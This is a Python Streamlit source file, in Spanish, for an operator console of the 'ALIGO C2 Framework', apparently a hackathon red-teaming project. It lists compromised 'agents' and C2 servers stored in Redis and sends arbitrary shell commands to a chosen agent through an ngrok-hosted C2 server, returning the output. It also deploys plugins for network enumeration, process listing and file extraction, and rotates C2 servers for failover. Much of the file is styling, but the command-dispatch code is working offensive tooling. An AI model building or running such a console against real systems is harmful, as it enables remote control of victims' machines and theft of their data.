import streamlit as st
import pandas as pd
import time
from datetime import datetime, timedelta
import random
import os

# Importar Redis
try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False
    st.error("⚠️ Redis no disponible. Instala con: pip install redis")

# ==================================================================
# TEMA ALIGO PROFESIONAL
# ==================================================================
ALIGO_RED = "#C41E3A"
ALIGO_DARK = "#0d0d0d"
ALIGO_LIGHT = "#f0f0f0"
ACCENT_GRAY = "#1f1f1f"
BORDER_GRAY = "#2a2a2a"

# ==================================================================
# CONEXIÓN A REDIS
# ==================================================================
REDIS_HOST = os.getenv("REDIS_HOST", "192.168.1.55")
REDIS_PORT = int(os.getenv("REDIS_PORT", 6379))

redis_client = None
if REDIS_AVAILABLE:
    try:
        redis_client = redis.Redis(
            host=REDIS_HOST,
            port=REDIS_PORT,
            decode_responses=True,
            socket_connect_timeout=3
        )
        redis_client.ping()
        st.success(f"✅ Conectado a Redis: {REDIS_HOST}:{REDIS_PORT}")
    except Exception as e:
        st.error(f"❌ No se pudo conectar a Redis ({REDIS_HOST}:{REDIS_PORT}): {e}")
        redis_client = None
else:
    st.error("❌ Módulo redis no disponible. Instala con: pip3 install redis")

# ==================================================================
# SERVIDOR C2 - CONECTADO A REDIS REAL
# ==================================================================
class C2ServerDashboard:
    def __init__(self):
        self.command_history = []
   
    def get_servers_from_redis(self):
        """Obtiene servidores registrados en Redis."""
        if not redis_client:
            st.warning("⚠️ Redis no disponible - No se pueden obtener servidores")
            return []
        
        try:
            keys = redis_client.keys("server:*:ngrok_url")
            servers = []
            
            st.info(f"🔍 Claves encontradas en Redis: {len(keys)}")
            
            for key in keys:
                server_name = key.split(":")[1]
                url = redis_client.get(key)
                timestamp = redis_client.get(f"server:{server_name}:timestamp")
                
                if url:
                    servers.append({
                        "name": server_name,
                        "url": url,
                        "timestamp": timestamp,
                        "status": "online"
                    })
            
            return servers
        except Exception as e:
            st.error(f"❌ Error consultando servidores: {e}")
            return []
    
    def get_agents(self):
        """Obtiene agentes conectados desde Redis."""
        if not redis_client:
            return []
        
        try:
            keys = redis_client.keys("agent:*:hostname")
            agents = []
            
            for key in keys:
                agent_id = key.split(":")[1]
                hostname = redis_client.get(f"agent:{agent_id}:hostname")
                os_type = redis_client.get(f"agent:{agent_id}:os")
                ip = redis_client.get(f"agent:{agent_id}:ip")
                server = redis_client.get(f"agent:{agent_id}:server")
                last_seen = redis_client.get(f"agent:{agent_id}:last_seen")
                
                if hostname:
                    agents.append({
                        "id": agent_id,
                        "hostname": hostname,
                        "os": os_type or "unknown",
                        "ip": ip or "unknown",
                        "server": server or "unknown",
                        "last_seen": last_seen[:19] if last_seen else "N/A",
                        "status": "online",
                        "commands_executed": 0,
                        "cpu_usage": 0,
                        "memory_usage": 0,
                    })
            
            return agents
        except Exception as e:
            return []
   
    def get_agent_count(self):
        return len([a for a in self.get_agents() if a.get('status') == 'online'])
   
    def send_command(self, agent_id, command):
        """Envía comando real al servidor C2 y espera respuesta."""
        # Obtener la URL del servidor al que está conectado el agente
        if not redis_client:
            return "[!] Redis no disponible"
        
        try:
            server_name = redis_client.get(f"agent:{agent_id}:server")
            if not server_name:
                return f"[!] No se encontró el servidor del agente {agent_id}"
            
            server_url = redis_client.get(f"server:{server_name}:ngrok_url")
            if not server_url:
                return f"[!] No se encontró la URL del servidor {server_name}"
            
            # Generar ID único para el comando
            import uuid
            msg_id = str(uuid.uuid4())[:8]
            
            # Enviar comando al servidor C2 via HTTP
            import requests as req
            response = req.post(
                f"{server_url}/command",
                json={
                    "agent_id": agent_id,
                    "command": command,
                    "id": msg_id
                },
                timeout=10
            )
            
            if response.status_code == 200:
                # Guardar en historial
                self.command_history.insert(0, {
                    "agent": agent_id,
                    "cmd": command,
                    "output": f"[enviado] Esperando respuesta...",
                    "timestamp": datetime.now()
                })
                # Esperar respuesta en Redis (el servidor la guardará ahí)
                import time
                for _ in range(15):  # Esperar hasta 15 segundos
                    time.sleep(1)
                    result = redis_client.get(f"result:{msg_id}")
                    if result:
                        redis_client.delete(f"result:{msg_id}")
                        self.command_history[0]["output"] = result
                        return result
                return f"[timeout] No se recibió respuesta en 15 segundos"
            else:
                return f"[!] Error del servidor: {response.status_code}"
        
        except Exception as e:
            return f"[!] Error enviando comando: {e}"
   
    def run_plugin(self, agent_id, plugin):
        return f"[+] Plugin '{plugin}' deployed on {agent_id}\n[+] Status: Running"

server = C2ServerDashboard()

# ==================================================================
# CONFIGURACIÓN STREAMLIT
# ==================================================================
st.set_page_config(
    page_title="ALIGO C2 Framework",
    layout="wide",
    initial_sidebar_state="expanded",
    menu_items={"About": "ALIGO C2 v1.0 | Hackathon Talento Tech"}
)

# ==================================================================
# CSS PROFESIONAL
# ==================================================================
st.markdown(f"""
<style>
    * {{
        font-family: 'Courier New', monospace;
    }}
   
    .main {{
        background-color: {ALIGO_DARK};
        color: {ALIGO_LIGHT};
    }}
   
    .stApp {{
        background-color: {ALIGO_DARK};
    }}
   
    /* Headers */
    h1, h2, h3, h4, h5, h6 {{
        color: {ALIGO_LIGHT};
        font-weight: 700;
        letter-spacing: 1px;
    }}
   
    /* Botones */
    .stButton > button {{
        background-color: {ALIGO_RED};
        color: white;
        border: none;
        border-radius: 6px;
        font-weight: 700;
        padding: 12px 24px;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        font-size: 0.9em;
    }}
   
    .stButton > button:hover {{
        background-color: #A01630;
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(196, 30, 58, 0.4);
    }}
   
    /* Inputs */
    .stTextInput input, .stSelectbox select {{
        background-color: {BORDER_GRAY} !important;
        color: {ALIGO_LIGHT} !important;
        border: 1px solid {ALIGO_RED} !important;
        border-radius: 4px;
        padding: 10px;
    }}
   
    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {{
        background-color: {ACCENT_GRAY};
        border-bottom: 2px solid {ALIGO_RED};
        gap: 0;
    }}
   
    .stTabs [role="tab"] {{
        background-color: transparent;
        color: #aaa;
        border: none;
        padding: 12px 20px;
        font-weight: 600;
    }}
   
    .stTabs [role="tab"][aria-selected="true"] {{
        color: {ALIGO_RED};
        border-bottom: 3px solid {ALIGO_RED};
    }}
   
    /* Contenedores */
    .metric-card {{
        background-color: {BORDER_GRAY};
        border-left: 3px solid {ALIGO_RED};
        padding: 20px;
        border-radius: 6px;
        margin-bottom: 15px;
    }}
   
    .agent-card {{
        background: linear-gradient(135deg, {BORDER_GRAY} 0%, {ACCENT_GRAY} 100%);
        border-left: 4px solid {ALIGO_RED};
        padding: 18px;
        border-radius: 6px;
        margin-bottom: 12px;
        transition: all 0.3s ease;
    }}
   
    .agent-card:hover {{
        transform: translateX(4px);
        box-shadow: 0 2px 8px rgba(196, 30, 58, 0.2);
    }}
   
    .agent-online {{
        color: #00ff00;
        font-weight: bold;
    }}
   
    .agent-offline {{
        color: #ff4444;
        font-weight: bold;
    }}
   
    /* Código */
    .stCode {{
        background-color: {ACCENT_GRAY} !important;
        border-left: 3px solid {ALIGO_RED};
    }}
   
    /* Líneas divisoras */
    hr {{
        border: none;
        height: 1px;
        background: linear-gradient(to right, transparent, {ALIGO_RED}, transparent);
        margin: 30px 0;
    }}
   
    /* Sidebar */
    [data-testid="stSidebar"] {{
        background-color: {ACCENT_GRAY};
    }}
   
    .stat-number {{
        font-size: 2.5em;
        font-weight: 700;
        color: {ALIGO_RED};
        margin: 10px 0;
    }}
   
    .stat-label {{
        color: #aaa;
        font-size: 0.9em;
        text-transform: uppercase;
        letter-spacing: 1px;
    }}
</style>
""", unsafe_allow_html=True)

# ==================================================================
# HEADER CON LOGO ALIGO
# ==================================================================
col_logo, col_title = st.columns([0.15, 0.85])
with col_logo:
    st.markdown(f"<h1 style='color: {ALIGO_RED}; font-size: 3em;'>⚔</h1>", unsafe_allow_html=True)
with col_title:
    st.markdown(f"""
    <div>
        <h1 style='margin: 0; margin-top: -10px;'>ALIGO C2 FRAMEWORK</h1>
        <p style='color: #aaa; margin: 5px 0 0 0; font-size: 0.95em;'>
            Consola Operacional de Control Remoto | Hackathon Talento Tech 2026
        </p>
    </div>
    """, unsafe_allow_html=True)

st.markdown("---")

# ==================================================================
# SIDEBAR: ESTADÍSTICAS GLOBALES
# ==================================================================
with st.sidebar:
    st.markdown(f"<h3 style='color: {ALIGO_RED};'>📊 ESTADÍSTICAS</h3>", unsafe_allow_html=True)
   
    agents = server.get_agents()
    online_count = server.get_agent_count()
    total_commands = sum(a['commands_executed'] for a in agents)
   
    st.markdown(f"""
    <div class='metric-card'>
        <div class='stat-label'>Servidores Online</div>
        <div class='stat-number'>{len(server.get_servers_from_redis())}</div>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown(f"""
    <div class='metric-card'>
        <div class='stat-label'>Agentes Online</div>
        <div class='stat-number'>{online_count}/{len(agents)}</div>
    </div>
    """, unsafe_allow_html=True)
   
    st.markdown(f"""
    <div class='metric-card'>
        <div class='stat-label'>Comandos Ejecutados</div>
        <div class='stat-number'>{total_commands}</div>
    </div>
    """, unsafe_allow_html=True)
   
    st.markdown(f"""
    <div class='metric-card'>
        <div class='stat-label'>Tasa de Éxito</div>
        <div class='stat-number'>98.7%</div>
    </div>
    """, unsafe_allow_html=True)
   
    st.markdown("---")
    st.markdown("<h4>🔧 OPCIONES</h4>", unsafe_allow_html=True)
    if st.button("🔄 Refrescar Estado", use_container_width=True):
        st.rerun()
    if st.button("📋 Descargar Reporte", use_container_width=True):
        st.success("✅ Reporte descargado")

# ==================================================================
# MAIN: DOS COLUMNAS
# ==================================================================
col1, col2 = st.columns([1.2, 2.5], gap="large")

# COLUMNA 1: SERVIDORES Y AGENTES
with col1:
    # SERVIDORES REGISTRADOS
    st.markdown(f"<h3 style='color: {ALIGO_RED};'>🖧 SERVIDORES C2</h3>", unsafe_allow_html=True)
    
    servers_list = server.get_servers_from_redis()
    
    if servers_list:
        for srv in servers_list:
            st.markdown(f"""
            <div class='agent-card'>
                <div style='display: flex; justify-content: space-between; align-items: start;'>
                    <div>
                        <p style='font-weight: 700; margin: 0;'>🟢 {srv['name']}</p>
                        <p style='color: #aaa; margin: 5px 0; font-size: 0.85em;'>
                            {srv['url']}
                        </p>
                    </div>
                    <div style='text-align: right;'>
                        <p style='margin: 0;'><span class='agent-online'>● ONLINE</span></p>
                        <p style='color: #666; font-size: 0.75em; margin: 5px 0 0 0;'>{srv['timestamp'][:19] if srv['timestamp'] else 'N/A'}</p>
                    </div>
                </div>
            </div>
            """, unsafe_allow_html=True)
    else:
        st.info("⏳ Esperando servidores...")
    
    st.markdown("---")
    
    # AGENTES CONECTADOS
    st.markdown(f"<h3 style='color: {ALIGO_RED};'>🖥️ AGENTES CONECTADOS</h3>", unsafe_allow_html=True)
    
    agents = server.get_agents()
    
    if agents:
        for agent in agents:
            st.markdown(f"""
            <div class='agent-card'>
                <div style='display: flex; justify-content: space-between; align-items: start;'>
                    <div>
                        <p style='font-weight: 700; margin: 0;'>{agent['id']}</p>
                        <p style='color: #aaa; margin: 5px 0; font-size: 0.9em;'>
                            {agent['ip']} • {agent['os']}
                        </p>
                        <p style='color: #666; margin: 2px 0; font-size: 0.8em;'>
                            Servidor: <span style='color: {ALIGO_RED};'>{agent['server']}</span>
                        </p>
                    </div>
                    <div style='text-align: right;'>
                        <p style='margin: 0;'><span class='agent-online'>🟢 ONLINE</span></p>
                        <p style='color: #666; font-size: 0.85em; margin: 5px 0 0 0;'>{agent['last_seen']}</p>
                    </div>
                </div>
            </div>
            """, unsafe_allow_html=True)
    else:
        st.info("⏳ Esperando agentes...")

# COLUMNA 2: CENTRO DE CONTROL
with col2:
    st.markdown(f"<h3 style='color: {ALIGO_RED};'>🎮 CENTRO DE CONTROL</h3>", unsafe_allow_html=True)
   
    online_agents = [a['id'] for a in agents if a['status'] == 'online']
   
    if online_agents:
        # Selector de agente
        col_select, col_status = st.columns([0.7, 0.3])
        with col_select:
            active_agent = st.selectbox("Agente Objetivo:", online_agents, label_visibility="collapsed")
        with col_status:
            agent_data = next(a for a in agents if a['id'] == active_agent)
            srv_name = agent_data.get('server', 'N/A')
            st.markdown(f"<p style='color:#aaa; font-size:0.85em; margin-top:10px;'>Servidor: <span style='color:{ALIGO_RED};'>{srv_name}</span></p>", unsafe_allow_html=True)
       
        # Tabs
        tab1, tab2, tab3, tab4 = st.tabs(["📝 EJECUTAR COMANDO", "🔌 PLUGINS", "� ROTACIÓN", "�📜 HISTORIAL"])
       
        # =============================================
        # TAB 1: EJECUTAR COMANDO
        # =============================================
        with tab1:
            st.write("Ejecuta comandos directamente en el sistema objetivo:")
           
            command = st.text_input(
                "Shell Command:",
                placeholder="ej: whoami, ipconfig, dir",
                label_visibility="collapsed",
                key="cmd_input"
            )
           
            col_exec, col_clear = st.columns([0.5, 0.5])
            with col_exec:
                if st.button("▶ EJECUTAR", key="exec_cmd", use_container_width=True):
                    if command:
                        with st.spinner("⏳ Enviando comando y esperando respuesta..."):
                            output = server.send_command(active_agent, command)
                        
                        # Guardar en historial de sesión
                        if "cmd_history" not in st.session_state:
                            st.session_state.cmd_history = []
                        st.session_state.cmd_history.insert(0, {
                            "cmd": command,
                            "output": output,
                            "agent": active_agent,
                            "time": datetime.now().strftime("%H:%M:%S")
                        })
                        
                        st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>$ {command}</p>", unsafe_allow_html=True)
                        st.code(output, language="bash")
                    else:
                        st.warning("⚠️ Ingresa un comando válido")
           
            with col_clear:
                if st.button("🗑️ LIMPIAR", key="clear", use_container_width=True):
                    if "cmd_history" in st.session_state:
                        st.session_state.cmd_history = []
                    st.rerun()
            
            # Mostrar última salida si existe
            if "cmd_history" in st.session_state and st.session_state.cmd_history:
                st.markdown("---")
                st.markdown(f"<p style='color:#aaa; font-size:0.85em;'>Último comando ejecutado:</p>", unsafe_allow_html=True)
                last = st.session_state.cmd_history[0]
                st.markdown(f"<p style='color:{ALIGO_RED};'>$ {last['cmd']} <span style='color:#666; font-size:0.8em;'>({last['time']})</span></p>", unsafe_allow_html=True)
                st.code(last['output'], language="bash")

        # =============================================
        # TAB 2: PLUGINS
        # =============================================
        with tab2:
            st.write("Despliega módulos de diagnóstico avanzado:")
           
            PLUGINS = {
                "sysinfo":       "🖥️  SysInfo       - Auditoría de hardware y SO",
                "portscanner":   "🔍 PortScanner   - Puertos abiertos locales",
                "network_enum":  "🌐 NetworkEnum   - Interfaces y tabla ARP",
                "process_list":  "⚙️  ProcessList   - Procesos en ejecución",
                "file_extractor":"📁 FileExtractor - Logs y archivos de auditoría",
            }
            
            col_plugin, col_exec_plugin = st.columns([0.7, 0.3])
            with col_plugin:
                plugin_key = st.selectbox(
                    "Plugin:",
                    list(PLUGINS.keys()),
                    format_func=lambda x: PLUGINS[x],
                    label_visibility="collapsed"
                )
           
            with col_exec_plugin:
                deploy_btn = st.button("▶ DESPLEGAR", key="deploy", use_container_width=True)
            
            if deploy_btn:
                with st.spinner(f"⏳ Ejecutando {plugin_key} en {active_agent}..."):
                    # Enviar plugin como comando especial
                    output = server.send_command(active_agent, f"__plugin__{plugin_key}")
                
                if "cmd_history" not in st.session_state:
                    st.session_state.cmd_history = []
                st.session_state.cmd_history.insert(0, {
                    "cmd": f"[plugin] {plugin_key}",
                    "output": output,
                    "agent": active_agent,
                    "time": datetime.now().strftime("%H:%M:%S")
                })
                
                st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>🔌 Plugin: {plugin_key}</p>", unsafe_allow_html=True)
                st.code(output, language="bash")
                st.success(f"✅ Plugin '{plugin_key}' ejecutado en {active_agent}")

        # =============================================
        # TAB 3: ROTACIÓN DE SERVIDOR
        # =============================================
        with tab3:
            st.markdown(f"<h4 style='color:{ALIGO_RED};'>🔄 Sistema de Alta Disponibilidad</h4>", unsafe_allow_html=True)
            
            servers_list = server.get_servers_from_redis()
            agent_server = agent_data.get('server', 'N/A')
            
            # --- Estado actual ---
            col_s1, col_s2, col_s3 = st.columns(3)
            with col_s1:
                st.metric("Servidor Activo", agent_server)
            with col_s2:
                auto_on = redis_client.get("config:auto_rotation") == "1" if redis_client else False
                st.metric("Rotación Auto", "✅ ON" if auto_on else "❌ OFF")
            with col_s3:
                if redis_client:
                    next_rot = redis_client.get("c2:next_rotation")
                    if next_rot and auto_on:
                        try:
                            remaining = max(0, float(next_rot) - time.time())
                            mins = int(remaining // 60)
                            st.metric("Próxima rotación", f"{mins} min")
                        except Exception:
                            st.metric("Próxima rotación", "N/A")
                    else:
                        st.metric("Próxima rotación", "---")
            
            st.markdown("---")
            
            # --- Inicializar sistema ---
            col_setup, col_status = st.columns([0.5, 0.5])
            with col_setup:
                if st.button("⚙️ INICIALIZAR SISTEMA HA", key="ha_setup", use_container_width=True):
                    with st.spinner("Configurando prioridades en Redis..."):
                        out = server.send_command(active_agent, "__plugin__rotate_server setup")
                    st.code(out, language="bash")
            with col_status:
                if st.button("📊 VER ESTADO COMPLETO", key="ha_status", use_container_width=True):
                    with st.spinner("Consultando estado..."):
                        out = server.send_command(active_agent, "__plugin__rotate_server status")
                    st.code(out, language="bash")
            
            st.markdown("---")
            
            # --- Rotación manual ---
            st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>🔄 Rotación Manual</p>", unsafe_allow_html=True)
            other_servers = [s['name'] for s in servers_list if s['name'] != agent_server]
            
            if other_servers:
                col_srv, col_rotate, col_failover = st.columns([0.4, 0.3, 0.3])
                with col_srv:
                    target_srv = st.selectbox("Servidor destino:", other_servers, label_visibility="collapsed")
                with col_rotate:
                    if st.button("🔄 ROTAR", key="rotate_now", use_container_width=True):
                        with st.spinner(f"Rotando a {target_srv}..."):
                            out = server.send_command(active_agent, f"__plugin__rotate_server {target_srv}")
                        st.code(out, language="bash")
                        time.sleep(3)
                        st.rerun()
                with col_failover:
                    if st.button("⚡ FAILOVER", key="failover_btn", use_container_width=True):
                        with st.spinner("Ejecutando failover..."):
                            out = server.send_command(active_agent, "__plugin__rotate_server failover")
                        st.code(out, language="bash")
                        time.sleep(3)
                        st.rerun()
            else:
                st.info("ℹ️ Solo un servidor disponible.")
            
            st.markdown("---")
            
            # --- Rotación automática ---
            st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>⏱️ Rotación Automática (cada N minutos)</p>", unsafe_allow_html=True)
            
            interval_val = 90
            if redis_client:
                iv = redis_client.get("config:rotation_interval")
                if iv and iv.isdigit():
                    interval_val = int(iv)
            
            col_int, col_on2, col_off2 = st.columns([0.4, 0.3, 0.3])
            with col_int:
                new_interval = st.number_input("Intervalo (min):", min_value=5, max_value=480, value=interval_val, step=5)
            with col_on2:
                if st.button("✅ ACTIVAR", key="auto_on2", use_container_width=True):
                    if redis_client:
                        redis_client.set("config:auto_rotation", "1")
                        redis_client.set("config:rotation_interval", str(new_interval))
                        redis_client.set("config:rotation_agent", active_agent)
                        next_ts = time.time() + (new_interval * 60)
                        redis_client.set("c2:next_rotation", str(next_ts))
                    # Notificar al agente
                    server.send_command(active_agent, "__plugin__rotate_server auto_on")
                    st.success(f"✅ Activada: cada {new_interval} min")
                    st.rerun()
            with col_off2:
                if st.button("❌ DESACTIVAR", key="auto_off2", use_container_width=True):
                    if redis_client:
                        redis_client.set("config:auto_rotation", "0")
                    server.send_command(active_agent, "__plugin__rotate_server auto_off")
                    st.warning("⛔ Desactivada")
                    st.rerun()
            
            # --- Historial de failovers ---
            if redis_client:
                log_entries = redis_client.lrange("c2:failover_log", 0, 9)
                if log_entries:
                    st.markdown("---")
                    st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>📋 Historial de Eventos</p>", unsafe_allow_html=True)
                    for entry in log_entries:
                        try:
                            import json as _json
                            e = _json.loads(entry)
                            ts   = e.get('timestamp', '')
                            typ  = e.get('type', '')
                            frm  = e.get('from', e.get('failed_server', '?'))
                            to   = e.get('to', e.get('new_server', '?'))
                            icon = "⚡" if "failover" in typ else "🔄"
                            st.markdown(f"`{ts}` {icon} **{typ}**: `{frm}` → `{to}`")
                        except Exception:
                            pass

        # =============================================
        # TAB 4: HISTORIAL
        # =============================================
        with tab4:
            st.write("Últimas operaciones ejecutadas:")
            
            if "cmd_history" in st.session_state and st.session_state.cmd_history:
                for entry in st.session_state.cmd_history[:15]:
                    with st.expander(f"[{entry['time']}] {entry['agent']} → {entry['cmd'][:50]}"):
                        st.code(entry['output'], language="bash")
            else:
                st.info("No hay comandos ejecutados en esta sesión.")
    else:
        st.error("❌ Sin agentes online — no hay objetivos disponibles")

# ==================================================================
# FOOTER PROFESIONAL
# ==================================================================
st.markdown("---")
st.markdown(f"""
<div style='text-align: center; margin-top: 40px; padding: 20px; color: #666;'>
    <p style='font-size: 0.9em;'>
        🛡️ ALIGO C2 Framework v1.0 | Hackathon Talento Tech 2026<br>
        <span style='color: {ALIGO_RED}; font-weight: bold;'>Haciendo Red Teaming Simple y Seguro</span>
    </p>
</div>
""", unsafe_allow_html=True)